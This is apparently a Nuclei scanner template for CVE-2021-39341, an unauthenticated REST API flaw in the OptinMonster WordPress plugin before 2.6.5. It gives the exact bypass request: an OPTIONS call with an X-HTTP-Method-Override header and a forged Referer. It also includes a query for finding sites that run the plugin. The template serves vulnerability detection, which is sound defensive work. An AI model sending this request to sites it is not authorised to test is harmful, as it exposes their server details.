http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - PHP Version
    - OptinMonster
    - '"functions.php"'
    - Server Info
  raw:
  - 'OPTIONS /wp-json/omapp/v1/support HTTP/1.1

    Host: {{Hostname}}

    X-HTTP-Method-Override: GET

    Referer: https://wp.app.optinmonster.test

    '
id: CVE-2021-39341
info:
  author: iamnoooob,pdresearch
  classification:
    cpe: cpe:2.3:a:optinmonster:optinmonster:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2021-39341
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 8.2
    cwe-id: CWE-285,CWE-863
    epss-percentile: 0.97416
    epss-score: 0.44317
  description: 'The OptinMonster WordPress plugin is vulnerable to sensitive information
    disclosure and unauthorized setting updates due to insufficient authorization
    validation via the logged_in_or_has_api_key function in the ~/OMAPI/RestApi.php
    file that can used to exploit inject malicious web scripts on sites with the plugin
    installed. This affects versions up to, and including, 2.6.4.

    '
  impact: 'Unauthenticated attackers can access sensitive system information including
    PHP version, server configuration, and plugin details via unprotected REST API
    endpoints.

    '
  metadata:
    framework: wordpress
    max-request: 1
    product: optinmonster
    publicwww-query: /wp-content/plugins/optinmonster
    vendor: optinmonster
    verified: true
  name: OptinMonster Plugin < 2.6.5 - Unprotected REST-API
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-39341
  - https://plugins.trac.wordpress.org/browser/optinmonster/trunk/OMAPI/RestApi.php?rev=2606519#L1460
  - https://wordfence.com/vulnerability-advisories/#CVE-2021-39341
  remediation: 'Upgrade to OptinMonster version 2.6.5 or later.

    '
  severity: high
  tags: cve,cve221,wordpress,wp-plugin,optinmonster,rest-api,disclosure,unauth,exposure,vkev,vuln
